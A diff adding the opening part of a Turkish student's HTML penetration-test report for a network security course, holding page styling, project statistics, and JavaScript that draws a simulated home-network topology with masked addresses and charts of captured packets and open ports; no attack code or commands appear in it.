@@ -1,0 +1,1073 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tam Sızma Testi Raporu — Ömer Faruk Özgür</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:#080c10;--bg2:#0d1117;--bg3:#161b22;--bg4:#1c2333;
+    --border:#21262d;--cyan:#00d4ff;--green:#00ff88;--red:#ff4757;
+    --orange:#ff8c00;--yellow:#ffd700;--text:#c9d1d9;--text-dim:#6e7681;--text-bright:#f0f6fc;
+    --font-mono:'Share Tech Mono',monospace;--font-ui:'Rajdhani',sans-serif;--font-body:'Inter',sans-serif;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{background:var(--bg);color:var(--text);font-family:var(--font-body);font-size:14px;line-height:1.7;overflow-x:hidden;}
+  body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,212,255,0.012) 2px,rgba(0,212,255,0.012) 4px);pointer-events:none;z-index:9999;}
+  body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background-image:linear-gradient(rgba(0,212,255,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0;}
+  nav{position:fixed;top:0;left:0;right:0;height:56px;background:rgba(8,12,16,0.95);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 32px;z-index:1000;backdrop-filter:blur(12px);gap:32px;}
+  .nav-logo{font-family:var(--font-mono);font-size:13px;color:var(--cyan);letter-spacing:2px;flex:1;}
+  .nav-logo span{color:var(--text-dim);}
+  nav a{font-family:var(--font-ui);font-size:13px;font-weight:600;color:var(--text-dim);text-decoration:none;letter-spacing:1px;text-transform:uppercase;transition:color 0.2s;}
+  nav a:hover{color:var(--cyan);}
+  .hero{position:relative;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:80px 32px 40px;z-index:1;overflow:hidden;}
+  .hero-glow{position:absolute;width:600px;height:600px;background:radial-gradient(circle,rgba(0,212,255,0.08) 0%,transparent 70%);top:50%;left:50%;transform:translate(-50%,-50%);pointer-events:none;}
+  .hero-tag{font-family:var(--font-mono);font-size:12px;color:var(--cyan);letter-spacing:4px;text-transform:uppercase;margin-bottom:24px;opacity:0;animation:fadeUp 0.6s ease 0.2s forwards;}
+  .hero h1{font-family:var(--font-ui);font-size:clamp(42px,7vw,80px);font-weight:700;color:var(--text-bright);line-height:1.1;letter-spacing:-1px;margin-bottom:16px;opacity:0;animation:fadeUp 0.6s ease 0.4s forwards;}
+  .hero h1 .accent{color:var(--cyan);}.hero h1 .red{color:var(--red);}
+  .hero-sub{font-family:var(--font-ui);font-size:20px;font-weight:600;color:var(--text-dim);letter-spacing:2px;margin-bottom:40px;opacity:0;animation:fadeUp 0.6s ease 0.6s forwards;}
+  .hero-flow{display:flex;align-items:center;gap:12px;margin-bottom:48px;opacity:0;animation:fadeUp 0.6s ease 0.8s forwards;}
+  .flow-step{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:10px 20px;font-family:var(--font-ui);font-size:14px;font-weight:600;letter-spacing:1px;}
+  .flow-step.s1{color:var(--cyan);border-color:var(--cyan);box-shadow:0 0 20px rgba(0,212,255,0.15);}
+  .flow-step.s2{color:var(--red);border-color:var(--red);box-shadow:0 0 20px rgba(255,71,87,0.15);}
+  .flow-step.s3{color:var(--green);border-color:var(--green);box-shadow:0 0 20px rgba(0,255,136,0.15);}
+  .flow-arrow{color:var(--text-dim);font-size:20px;}
+  .hero-meta{display:flex;gap:32px;flex-wrap:wrap;justify-content:center;opacity:0;animation:fadeUp 0.6s ease 1s forwards;}
+  .meta-item{text-align:center;}
+  .meta-label{font-family:var(--font-mono);font-size:10px;color:var(--text-dim);letter-spacing:2px;text-transform:uppercase;margin-bottom:4px;}
+  .meta-value{font-family:var(--font-ui);font-size:15px;font-weight:600;color:var(--text-bright);}
+  .scroll-hint{position:absolute;bottom:32px;left:50%;transform:translateX(-50%);font-family:var(--font-mono);font-size:11px;color:var(--text-dim);letter-spacing:2px;animation:pulse 2s ease infinite;}
+  section{position:relative;z-index:1;max-width:1100px;margin:0 auto;padding:80px 32px;}
+  .section-header{display:flex;align-items:center;gap:16px;margin-bottom:48px;}
+  .section-num{font-family:var(--font-mono);font-size:11px;color:var(--text-dim);letter-spacing:2px;}
+  .section-line{flex:1;height:1px;background:linear-gradient(90deg,var(--border),transparent);}
+  .section-title{font-family:var(--font-ui);font-size:32px;font-weight:700;color:var(--text-bright);letter-spacing:-0.5px;}
+  .section-title .c{color:var(--cyan);}.section-title .r{color:var(--red);}.section-title .g{color:var(--green);}
+  .section-divider{width:100%;height:1px;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  .card{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:24px;margin-bottom:20px;transition:border-color 0.2s,box-shadow 0.2s;}
+  .card:hover{border-color:rgba(0,212,255,0.3);box-shadow:0 0 30px rgba(0,212,255,0.05);}
+  .card-title{font-family:var(--font-ui);font-size:16px;font-weight:700;color:var(--text-bright);margin-bottom:12px;display:flex;align-items:center;gap:10px;}
+  .badge{font-family:var(--font-mono);font-size:10px;padding:3px 8px;border-radius:4px;letter-spacing:1px;}
+  .badge-cyan{background:rgba(0,212,255,0.1);color:var(--cyan);border:1px solid rgba(0,212,255,0.3);}
+  .badge-red{background:rgba(255,71,87,0.1);color:var(--red);border:1px solid rgba(255,71,87,0.3);}
+  .badge-green{background:rgba(0,255,136,0.1);color:var(--green);border:1px solid rgba(0,255,136,0.3);}
+  .badge-orange{background:rgba(255,140,0,0.1);color:var(--orange);border:1px solid rgba(255,140,0,0.3);}
+  .badge-yellow{background:rgba(255,215,0,0.1);color:var(--yellow);border:1px solid rgba(255,215,0,0.3);}
+  .code-block{background:#010409;border:1px solid var(--border);border-left:3px solid var(--cyan);border-radius:8px;padding:16px 20px;margin:12px 0;font-family:var(--font-mono);font-size:13px;color:var(--cyan);overflow-x:auto;}
+  .code-block .prompt{color:var(--green);}.code-block .comment{color:var(--text-dim);}.code-block .result{color:var(--text);}
+  .data-table{width:100%;border-collapse:collapse;font-size:13px;margin:16px 0;}
+  .data-table th{background:var(--bg3);color:var(--cyan);font-family:var(--font-mono);font-size:11px;letter-spacing:1px;text-transform:uppercase;padding:10px 14px;text-align:left;border-bottom:1px solid var(--border);}
+  .data-table td{padding:10px 14px;border-bottom:1px solid rgba(33,38,45,0.5);color:var(--text);}
+  .data-table tr:hover td{background:rgba(0,212,255,0.03);}
+  .data-table .mono{font-family:var(--font-mono);font-size:12px;}
+  .data-table .danger{color:var(--red);font-weight:600;}
+  .data-table .warn{color:var(--orange);}
+  .data-table .ok{color:var(--green);}
+  .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
+  .grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:20px;}
+  .stat-card{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:24px;text-align:center;}
+  .stat-num{font-family:var(--font-ui);font-size:48px;font-weight:700;line-height:1;margin-bottom:8px;}
+  .stat-label{font-family:var(--font-mono);font-size:11px;color:var(--text-dim);letter-spacing:2px;text-transform:uppercase;}
+  .timeline{position:relative;padding-left:32px;}
+  .timeline::before{content:'';position:absolute;left:8px;top:8px;bottom:8px;width:1px;background:linear-gradient(180deg,var(--cyan),var(--red),var(--green));}
+  .timeline-item{position:relative;margin-bottom:32px;}
+  .timeline-dot{position:absolute;left:-28px;top:6px;width:10px;height:10px;border-radius:50%;border:2px solid var(--cyan);background:var(--bg);}
+  .timeline-dot.red{border-color:var(--red);}
+  .timeline-title{font-family:var(--font-ui);font-size:15px;font-weight:700;color:var(--text-bright);margin-bottom:6px;}
+  .cvss-bar{display:flex;align-items:center;gap:12px;margin:8px 0;}
+  .cvss-label{font-family:var(--font-mono);font-size:12px;color:var(--text-dim);width:200px;flex-shrink:0;}
+  .cvss-track{flex:1;height:6px;background:var(--bg3);border-radius:3px;overflow:hidden;}
+  .cvss-fill{height:100%;border-radius:3px;}
+  .cvss-score{font-family:var(--font-mono);font-size:12px;font-weight:700;width:36px;text-align:right;}
+  .critical{background:linear-gradient(90deg,var(--red),#ff0000);color:var(--red);}
+  .high{background:linear-gradient(90deg,var(--orange),#ff6b00);color:var(--orange);}
+  .medium{background:linear-gradient(90deg,var(--yellow),#ffaa00);color:var(--yellow);}
+  .rule-card{background:#010409;border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:12px;display:grid;grid-template-columns:auto 1fr auto;gap:16px;align-items:center;}
+  .rule-num{font-family:var(--font-mono);font-size:24px;font-weight:700;color:var(--border);}
+  .rule-code{font-family:var(--font-mono);font-size:12px;color:var(--cyan);}
+  .rule-desc{font-size:12px;color:var(--text-dim);margin-top:4px;}
+  footer{position:relative;z-index:1;border-top:1px solid var(--border);padding:32px;text-align:center;}
+  .footer-text{font-family:var(--font-mono);font-size:12px;color:var(--text-dim);letter-spacing:2px;}
+  .footer-text span{color:var(--cyan);}
+  .terminal{background:#010409;border:1px solid var(--border);border-radius:10px;overflow:hidden;margin:16px 0;}
+  .terminal-bar{background:var(--bg3);padding:10px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border);}
+  .dot{width:10px;height:10px;border-radius:50%;}
+  .dot.r{background:#ff5f57;}.dot.y{background:#febc2e;}.dot.g2{background:#28c840;}
+  .terminal-title{font-family:var(--font-mono);font-size:11px;color:var(--text-dim);margin-left:8px;}
+  .terminal-body{padding:16px 20px;font-family:var(--font-mono);font-size:12px;line-height:2;}
+  .t-prompt{color:var(--green);}.t-cmd{color:var(--text-bright);}.t-out{color:var(--text-dim);}.t-highlight{color:var(--cyan);}
+  p{margin-bottom:12px;color:var(--text);line-height:1.8;}
+  .reveal{opacity:0;transform:translateY(30px);transition:opacity 0.6s ease,transform 0.6s ease;}
+  .reveal.visible{opacity:1;transform:translateY(0);}
+  @keyframes fadeUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+  @keyframes pulse{0%,100%{opacity:0.4;}50%{opacity:1;}}
+  @media(max-width:768px){.grid-2,.grid-3{grid-template-columns:1fr;}.hero-flow{flex-direction:column;}.rule-card{grid-template-columns:1fr;}.cvss-label{width:120px;}}
+</style>
+</head>
+<body>
+<nav>
+  <div class="nav-logo">PENTEST<span>::</span>RAPOR</div>
+  <a href="#dashboard">Dashboard</a>
+  <a href="#kesif">Keşif</a>
+  <a href="#saldiri">Saldırı</a>
+  <a href="#savunma">Savunma</a>
+  <a href="#ozet">Özet</a>
+</nav>
+
+<div class="hero">
+  <div class="hero-glow"></div>
+  <div class="hero-tag">// Bilgisayar Ağ Güvenliği — Final Projesi</div>
+  <h1>Tam <span class="accent">Sızma Testi</span><br><span class="red">Simülasyonu</span></h1>
+  <div class="hero-sub">Keşif &nbsp;→&nbsp; Saldırı &nbsp;→&nbsp; Savunma</div>
+  <div class="hero-flow">
+    <div class="flow-step s1">01 / NMAP KEŞİF</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step s2">02 / DVWA SALDIRI</div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step s3">03 / IPTABLES SAVUNMA</div>
+  </div>
+  <div class="hero-meta">
+    <div class="meta-item"><div class="meta-label">Hazırlayan</div><div class="meta-value">Ömer Faruk Özgür</div></div>
+    <div class="meta-item"><div class="meta-label">Öğrenci No</div><div class="meta-value">22430070048</div></div>
+    <div class="meta-item"><div class="meta-label">Bölüm</div><div class="meta-value">Bilişim Sistemleri ve Teknolojileri - 4</div></div>
+    <div class="meta-item"><div class="meta-label">Tarih</div><div class="meta-value">Mayıs 2026</div></div>
+  </div>
+  <div class="scroll-hint">▼ &nbsp; ASAGI KAYDIR &nbsp; ▼</div>
+</div>
+
+<div class="section-divider"></div>
+
+<section class="reveal">
+  <div class="section-header">
+    <div class="section-num">// 00</div>
+    <div class="section-title">Proje <span class="c">İstatistikleri</span></div>
+    <div class="section-line"></div>
+  </div>
+  <div class="grid-3">
+    <div class="stat-card"><div class="stat-num" style="color:var(--cyan)">5</div><div class="stat-label">Tespit Edilen Cihaz</div></div>
+    <div class="stat-card"><div class="stat-num" style="color:var(--red)">8</div><div class="stat-label">Keşfedilen Zafiyet</div></div>
+    <div class="stat-card"><div class="stat-num" style="color:var(--green)">4</div><div class="stat-label">iptables Kuralı</div></div>
+    <div class="stat-card"><div class="stat-num" style="color:var(--orange)">4374</div><div class="stat-label">Yakalanan Paket</div></div>
+    <div class="stat-card"><div class="stat-num" style="color:var(--yellow)">5</div><div class="stat-label">Çalınan Şifre Hash'i</div></div>
+    <div class="stat-card"><div class="stat-num" style="color:var(--red)">9.8</div><div class="stat-label">Max CVSS Skoru</div></div>
+  </div>
+</section>
+
+<div class="section-divider"></div>
+
+<!-- ══════════ DASHBOARD ══════════ -->
+<section id="dashboard" class="reveal" style="max-width:1200px;">
+  <div class="section-header">
+    <div class="section-num">// 01</div>
+    <div class="section-title">Ağ <span class="c">Dashboard</span> & Topoloji</div>
+    <div class="section-line"></div>
+  </div>
+
+  <!-- Canli Sunucu Baglanti Paneli -->
+  <div class="card reveal" style="margin-bottom:24px;border-color:rgba(0,255,136,0.3);">
+    <div style="display:flex;align-items:center;gap:16px;flex-wrap:wrap;">
+      <div>
+        <div style="font-family:var(--font-ui);font-weight:700;color:var(--text-bright);font-size:15px;margin-bottom:4px;">Flask Sunucu Bağlantısı</div>
+        <div style="font-family:var(--font-mono);font-size:11px;color:var(--text-dim);">ag_tarama_server.py çalışıyorsa gerçek Nmap verisi gelir</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px;margin-left:auto;">
+        <div id="serverDot" style="width:10px;height:10px;border-radius:50%;background:var(--text-dim);transition:background 0.3s;"></div>
+        <div id="serverStatus" style="font-family:var(--font-mono);font-size:12px;color:var(--text-dim);">Kontrol ediliyor...</div>
+      </div>
+      <button onclick="connectServer()" style="background:rgba(0,255,136,0.1);border:1px solid var(--green);color:var(--green);font-family:var(--font-mono);font-size:12px;padding:8px 16px;border-radius:6px;cursor:pointer;letter-spacing:1px;">BAĞLAN & TARA</button>
+      <button onclick="useMockData()" style="background:rgba(0,212,255,0.1);border:1px solid var(--cyan);color:var(--cyan);font-family:var(--font-mono);font-size:12px;padding:8px 16px;border-radius:6px;cursor:pointer;letter-spacing:1px;">SİMÜLASYON</button>
+    </div>
+    <div id="serverLog" style="margin-top:12px;font-family:var(--font-mono);font-size:11px;color:var(--text-dim);min-height:20px;"></div>
+  </div>
+
+  <!-- Topoloji + Grafikler -->
+  <div style="display:grid;grid-template-columns:1.2fr 1fr;gap:24px;margin-bottom:24px;">
+
+    <!-- AĞ TOPOLOJİSİ -->
+    <div class="card" style="padding:0;overflow:hidden;">
+      <div style="padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;">
+        <div style="font-family:var(--font-ui);font-weight:700;color:var(--text-bright);font-size:15px;">İnteraktif Ağ Topolojisi</div>
+        <div style="font-family:var(--font-mono);font-size:10px;color:var(--green);letter-spacing:2px;">● CANLI SİMÜLASYON</div>
+      </div>
+      <div style="position:relative;height:420px;background:#010409;">
+        <canvas id="topoCanvas" width="600" height="420" style="width:100%;height:100%;cursor:pointer;"></canvas>
+        <!-- Cihaz Detay Paneli -->
+        <div id="devicePanel" style="display:none;position:absolute;top:12px;right:12px;width:200px;background:rgba(13,17,23,0.97);border:1px solid var(--cyan);border-radius:8px;padding:14px;font-family:var(--font-mono);font-size:11px;">
+          <div id="panelTitle" style="color:var(--cyan);font-size:13px;font-weight:700;margin-bottom:10px;"></div>
+          <div id="panelContent"></div>
+          <div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border);font-size:10px;color:var(--text-dim);">Kapatmak için tıklayın</div>
+        </div>
+        <div style="position:absolute;bottom:10px;left:12px;font-family:var(--font-mono);font-size:10px;color:var(--text-dim);">↖ Cihaza tıkla → detay göster</div>
+      </div>
+    </div>
+
+    <!-- GRAFİKLER SÜTUNU -->
+    <div style="display:flex;flex-direction:column;gap:16px;">
+
+      <!-- Paket Dağılımı Pasta -->
+      <div class="card" style="padding:16px;">
+        <div style="font-family:var(--font-ui);font-weight:700;color:var(--text-bright);font-size:14px;margin-bottom:12px;">Paket Dağılımı (4374 paket)</div>
+        <div style="display:flex;align-items:center;gap:16px;">
+          <canvas id="pieChart" width="120" height="120" style="flex-shrink:0;"></canvas>
+          <div id="pieLegend" style="font-family:var(--font-mono);font-size:11px;line-height:2.2;"></div>
+        </div>
+      </div>
+
+      <!-- Port Dağılımı Bar -->
+      <div class="card" style="padding:16px;">
+        <div style="font-family:var(--font-ui);font-weight:700;color:var(--text-bright);font-size:14px;margin-bottom:12px;">Açık Port Dağılımı</div>
+        <canvas id="barChart" width="300" height="130"></canvas>
+      </div>
+
+      <!-- Zafiyet Türleri -->
+      <div class="card" style="padding:16px;">
+        <div style="font-family:var(--font-ui);font-weight:700;color:var(--text-bright);font-size:14px;margin-bottom:12px;">Zafiyet Kategorileri</div>
+        <canvas id="vulnChart" width="300" height="110"></canvas>
+      </div>
+    </div>
+  </div>
+
+  <!-- iptables Canlı Log Simülasyonu -->
+  <div class="card" style="padding:0;overflow:hidden;">
+    <div style="padding:14px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px;">
+      <div style="width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse2 1.5s ease infinite;"></div>
+      <div style="font-family:var(--font-ui);font-weight:700;color:var(--text-bright);font-size:15px;">iptables Log Stream</div>
+      <div style="margin-left:auto;font-family:var(--font-mono);font-size:10px;color:var(--text-dim);" id="logTime"></div>
+    </div>
+    <div id="logStream" style="height:180px;overflow-y:auto;padding:12px 20px;font-family:var(--font-mono);font-size:11px;line-height:2;background:#010409;"></div>
+  </div>
+
+</section>
+
+<style>
+@keyframes pulse2{0%,100%{opacity:1;}50%{opacity:0.3;}}
+.log-drop{color:#ff4757;}.log-acc{color:#00ff88;}.log-warn{color:#ff8c00;}.log-info{color:#6e7681;}
+</style>
+
+<script>
+// ═══════════════════════════════
+// AĞ TOPOLOJİSİ
+// ═══════════════════════════════
+const devices = [
+  { id:'router', x:300, y:200, label:'192.168.X.1', name:'Huawei Router', icon:'R', color:'#00d4ff',
+    ports:['53/tcp — DNS','80/tcp — HTTP ⚠','443/tcp — HTTPS','631/tcp — IPP'],
+    os:'Linux 2.6.x', risk:'ORTA', mac:'AA:BB:CC:DD:EE:01' },
+  { id:'tv', x:120, y:330, label:'192.168.X.3', name:'Humax TV Kutusu', icon:'T', color:'#ff4757',
+    ports:['23/tcp — TELNET 🔴 KRİTİK'],
+    os:'Linux 2.6.32-3.10', risk:'KRİTİK', mac:'AA:BB:CC:DD:EE:03' },
+  { id:'phone1', x:480, y:330, label:'192.168.X.2', name:'Bilinmiyor (Telefon)', icon:'P', color:'#6e7681',
+    ports:['Açık port yok'],
+    os:'Bilinmiyor', risk:'DÜŞÜK', mac:'AA:BB:CC:DD:EE:02' },
+  { id:'iphone', x:480, y:100, label:'192.168.X.4', name:'iPhone', icon:'i', color:'#ff8c00',
+    ports:['49152/tcp — UPnP','62078/tcp — iOS'],
+    os:'iOS', risk:'ORTA', mac:'AA:BB:CC:DD:EE:04' },
+  { id:'pc', x:120, y:100, label:'192.168.X.7', name:'Test Bilgisayarı', icon:'PC', color:'#00ff88',
+    ports:['Bu sistem — Saldırgan'],
+    os:'Windows 11 + Docker', risk:'YOK', mac:'—' },
+];
+
+// Mock veriyi yedekle — simülasyon moduna dönmek için
+const mockDevices = JSON.parse(JSON.stringify(devices));
+const mockLinks = [['router','tv'],['router','phone1'],['router','iphone'],['router','pc']];
+let links = [...mockLinks];
+
+const canvas = document.getElementById('topoCanvas');
+const ctx = canvas.getContext('2d');
+let animFrame = 0;
+let packets = [];
+let selectedDevice = null;
+
+function resizeCanvas() {
+  const rect = canvas.parentElement.getBoundingClientRect();
+  canvas.width = rect.width || 600;
+  canvas.height = 420;
+  // Sadece mock cihazlar varsa (5 tane) pozisyonları güncelle
+  if (devices.length === 5) {
+    devices[0].x = canvas.width * 0.5;  devices[0].y = canvas.height * 0.48;
+    devices[1].x = canvas.width * 0.18; devices[1].y = canvas.height * 0.78;
+    devices[2].x = canvas.width * 0.82; devices[2].y = canvas.height * 0.78;
+    devices[3].x = canvas.width * 0.82; devices[3].y = canvas.height * 0.22;
+    devices[4].x = canvas.width * 0.18; devices[4].y = canvas.height * 0.22;
+  }
+}
+
+function spawnPacket() {
+  if (links.length === 0 || devices.length === 0) return;
+  const link = links[Math.floor(Math.random() * links.length)];
+  const from = devices.find(d => d.id === link[0]);
+  const to = devices.find(d => d.id === link[1]);
+  if (!from || !to) return;
+  const rev = Math.random() > 0.5;
+  packets.push({ x: rev ? to.x : from.x, y: rev ? to.y : from.y,
+    tx: rev ? from.x : to.x, ty: rev ? from.y : to.y,
+    progress: 0, speed: 0.012 + Math.random() * 0.01,
+    color: Math.random() > 0.3 ? '#00d4ff' : '#ff4757' });
+}
+
+// Mock verilere sıfırla
+function resetToMockDevices() {
+  devices.length = 0;
+  links.length = 0;
+  packets.length = 0;
+  const mockDevices = [
+    { id:'router', label:'192.168.X.1', name:'Huawei Router', icon:'R', color:'#00d4ff',
+      ports:['53/tcp — DNS','80/tcp — HTTP ⚠','443/tcp — HTTPS','631/tcp — IPP'],
+      os:'Linux 2.6.x', risk:'ORTA', mac:'AA:BB:CC:DD:EE:01' },
+    { id:'tv', label:'192.168.X.3', name:'Humax TV Kutusu', icon:'T', color:'#ff4757',
+      ports:['23/tcp — TELNET 🔴 KRİTİK'],
+      os:'Linux 2.6.32-3.10', risk:'KRİTİK', mac:'AA:BB:CC:DD:EE:03' },
+    { id:'phone1', label:'192.168.X.2', name:'Bilinmiyor (Telefon)', icon:'P', color:'#6e7681',
+      ports:['Açık port yok'], os:'Bilinmiyor', risk:'DÜŞÜK', mac:'AA:BB:CC:DD:EE:02' },
+    { id:'iphone', label:'192.168.X.4', name:'iPhone', icon:'i', color:'#ff8c00',
+      ports:['49152/tcp — UPnP','62078/tcp — iOS'],
+      os:'iOS', risk:'ORTA', mac:'AA:BB:CC:DD:EE:04' },
+    { id:'pc', label:'192.168.X.7', name:'Test Bilgisayarı', icon:'PC', color:'#00ff88',
+      ports:['Bu sistem — Saldırgan'],
+      os:'Windows 11 + Docker', risk:'YOK', mac:'—' },
+  ];
+  const mockLinks = [['router','tv'],['router','phone1'],['router','iphone'],['router','pc']];
+  mockDevices.forEach(d => devices.push(d));
+  mockLinks.forEach(l => links.push(l));
+  resizeCanvas();
+}
+
+function drawTopo() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+  // Links
+  links.forEach(([a, b]) => {
+    const da = devices.find(d => d.id === a);
+    const db = devices.find(d => d.id === b);
+    ctx.beginPath();
+    ctx.moveTo(da.x, da.y);
+    ctx.lineTo(db.x, db.y);
+    ctx.strokeStyle = 'rgba(33,38,45,0.8)';
+    ctx.lineWidth = 1.5;
+    ctx.stroke();
+  });
+
+  // Packets
+  packets.forEach((p, i) => {
+    p.progress += p.speed;
+    p.x = p.x + (p.tx - p.x) * p.speed * 2;
+    p.y = p.y + (p.ty - p.y) * p.speed * 2;
+    ctx.beginPath();
+    ctx.arc(p.x, p.y, 3, 0, Math.PI * 2);
+    ctx.fillStyle = p.color;
+    ctx.shadowColor = p.color;
+    ctx.shadowBlur = 8;
+    ctx.fill();
+    ctx.shadowBlur = 0;
+    if (p.progress >= 1) packets.splice(i, 1);
+  });
+
+  // Devices
+  devices.forEach(dev => {
+    const isSelected = selectedDevice && selectedDevice.id === dev.id;
+    const r = 28;
+
+    // Glow
+    ctx.beginPath();
+    ctx.arc(dev.x, dev.y, r + 10, 0, Math.PI * 2);
+    const grd = ctx.createRadialGradient(dev.x, dev.y, r, dev.x, dev.y, r + 20);
+    grd.addColorStop(0, dev.color + '30');
+    grd.addColorStop(1, 'transparent');
+    ctx.fillStyle = grd;
+    ctx.fill();
+
+    // Circle
+    ctx.beginPath();
+    ctx.arc(dev.x, dev.y, r, 0, Math.PI * 2);
+    ctx.fillStyle = '#010409';
+    ctx.fill();
+    ctx.strokeStyle = isSelected ? '#ffffff' : dev.color;
+    ctx.lineWidth = isSelected ? 2.5 : 1.5;
+    ctx.stroke();
+
+    // Icon
+    ctx.font = 'bold 13px Share Tech Mono, monospace';
+    ctx.fillStyle = dev.color;
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+    ctx.fillText(dev.icon, dev.x, dev.y);
+
+    // Label
+    ctx.font = '10px Share Tech Mono, monospace';
+    ctx.fillStyle = '#6e7681';
+    ctx.fillText(dev.label, dev.x, dev.y + r + 14);
+
+    // Risk badge for critical
+    if (dev.risk === 'KRİTİK') {
+      ctx.beginPath();
+      ctx.arc(dev.x + r - 6, dev.y - r + 6, 7, 0, Math.PI * 2);
+      ctx.fillStyle = '#ff4757';
+      ctx.fill();
+      ctx.font = 'bold 9px Arial';
+      ctx.fillStyle = '#fff';
+      ctx.fillText('!', dev.x + r - 6, dev.y - r + 7);
+    }
+  });
+
+  animFrame++;
+  if (animFrame % 30 === 0) spawnPacket();
+  requestAnimationFrame(drawTopo);
+}
+
+canvas.addEventListener('click', (e) => {
+  const rect = canvas.getBoundingClientRect();
+  const mx = (e.clientX - rect.left) * (canvas.width / rect.width);
+  const my = (e.clientY - rect.top) * (canvas.height / rect.height);
+  const panel = document.getElementById('devicePanel');
+
+  let hit = null;
+  devices.forEach(dev => {
+    const dx = mx - dev.x, dy = my - dev.y;
+    if (Math.sqrt(dx*dx + dy*dy) < 32) hit = dev;
+  });
+
+  if (hit) {
+    selectedDevice = hit;
+    document.getElementById('panelTitle').textContent = hit.name;
+    const riskColor = hit.risk === 'KRİTİK' ? '#ff4757' : hit.risk === 'ORTA' ? '#ff8c00' : '#00ff88';
+    document.getElementById('panelContent').innerHTML =
+      `<div style="color:#6e7681;margin-bottom:6px;">${hit.label}</div>` +
+      `<div style="color:#6e7681;">MAC: ${hit.mac}</div>` +
+      `<div style="color:#6e7681;margin-bottom:8px;">OS: ${hit.os}</div>` +
+      `<div style="color:#c9d1d9;margin-bottom:4px;">Açık Portlar:</div>` +
+      hit.ports.map(p => `<div style="color:${p.includes('KRİTİK') ? '#ff4757' : p.includes('⚠') ? '#ff8c00' : '#00d4ff'}">${p}</div>`).join('') +
+      `<div style="margin-top:8px;padding:4px 8px;background:${riskColor}20;border:1px solid ${riskColor};border-radius:4px;color:${riskColor};text-align:center;">Risk: ${hit.risk}</div>`;
+    panel.style.display = 'block';
+  } else {
+    selectedDevice = null;
+    panel.style.display = 'none';
+  }
+});
+
+resizeCanvas();
+drawTopo();
+for(let i=0;i<5;i++) spawnPacket();
+
+// ═══════════════════════════════
+// PASTA GRAFİK
+// ═══════════════════════════════
+const pieData = [
+  { label:'Nmap SYN', value:2389, color:'#00d4ff' },
+  { label:'TCP Diğer', value:947, color:'#00ff88' },
+  { label:'UDP', value:46, color:'#ff8c00' },
+  { label:'Diğer', value:992, color:'#21262d' },
+];
+const pieCanvas = document.getElementById('pieChart');
+const pieCtx = pieCanvas.getContext('2d');
+const total = pieData.reduce((s,d)=>s+d.value,0);
+let startAngle = -Math.PI/2;
+pieData.forEach(d => {
+  const slice = (d.value / total) * Math.PI * 2;
+  pieCtx.beginPath();
+  pieCtx.moveTo(60,60);
+  pieCtx.arc(60,60,55,startAngle,startAngle+slice);
+  pieCtx.fillStyle = d.color;
+  pieCtx.fill();
+  startAngle += slice;
+});
+// Donut hole
+pieCtx.beginPath();
+pieCtx.arc(60,60,30,0,Math.PI*2);
+pieCtx.fillStyle = '#0d1117';
+pieCtx.fill();
+
+const legend = document.getElementById('pieLegend');
+pieData.forEach(d => {
+  legend.innerHTML += `<div><span style="color:${d.color}">■</span> ${d.label}: <span style="color:#f0f6fc">${d.value}</span></div>`;
+});
+
+// ═══════════════════════════════
+// BAR GRAFİK — PORT DAĞILIMI
+// ═══════════════════════════════
+const barCanvas = document.getElementById('barChart');
+const barCtx = barCanvas.getContext('2d');
+barCanvas.width = barCanvas.parentElement.clientWidth - 32 || 280;
+const barData = [
+  { label:'53\nDNS', value:85, color:'#00ff88' },
+  { label:'80\nHTTP', value:95, color:'#ff8c00' },
+  { label:'443\nHTTPS', value:70, color:'#00d4ff' },
+  { label:'23\nTelnet', value:100, color:'#ff4757' },
+  { label:'631\nIPP', value:40, color:'#6e7681' },
+  { label:'62078\niOS', value:30, color:'#6e7681' },
+];
+const bw = barCanvas.width / barData.length - 10;
+barData.forEach((d,i) => {
+  const x = i * (bw + 10) + 5;
+  const barH = (d.value / 100) * 80;
+  const y = 100 - barH;
+  // Animated bar via gradient
+  const grad = barCtx.createLinearGradient(0, y, 0, 100);
+  grad.addColorStop(0, d.color);
+  grad.addColorStop(1, d.color + '30');
+  barCtx.fillStyle = grad;
+  barCtx.beginPath();
+  barCtx.roundRect(x, y, bw, barH, [3,3,0,0]);
+  barCtx.fill();
+  // Label
+  barCtx.fillStyle = '#6e7681';
+  barCtx.font = '9px Share Tech Mono, monospace';
+  barCtx.textAlign = 'center';
+  const lines = d.label.split('\n');
+  lines.forEach((line, li) => {
+    barCtx.fillText(line, x + bw/2, 112 + li * 12);
+  });
+});
+
+// ═══════════════════════════════
+// DONUT — ZAFİYET KATEGORİLERİ
+// ═══════════════════════════════
